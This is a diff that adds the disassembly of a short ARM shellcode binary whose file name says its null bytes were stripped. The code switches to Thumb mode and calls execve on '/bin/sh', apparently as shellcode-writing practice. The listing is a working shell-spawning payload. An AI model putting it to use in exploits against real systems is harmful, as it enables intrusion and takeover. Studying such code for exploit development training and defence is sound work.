@@ -1,0 +1,17 @@
+
+shellcode_NULLs_stripped:     file format elf32-littlearm
+
+
+Disassembly of section .text:
+
+00010054 <_start>:
+   10054:	e28f3001 	add	r3, pc, #1
+   10058:	e12fff13 	bx	r3
+   1005c:	a002      	add	r0, pc, #8	; (adr r0, 10068 <_start+0x14>)
+   1005e:	4049      	eors	r1, r1
+   10060:	4052      	eors	r2, r2
+   10062:	71c2      	strb	r2, [r0, #7]
+   10064:	270b      	movs	r7, #11
+   10066:	df01      	svc	1
+   10068:	6e69622f 	.word	0x6e69622f
+   1006c:	7868732f 	.word	0x7868732f
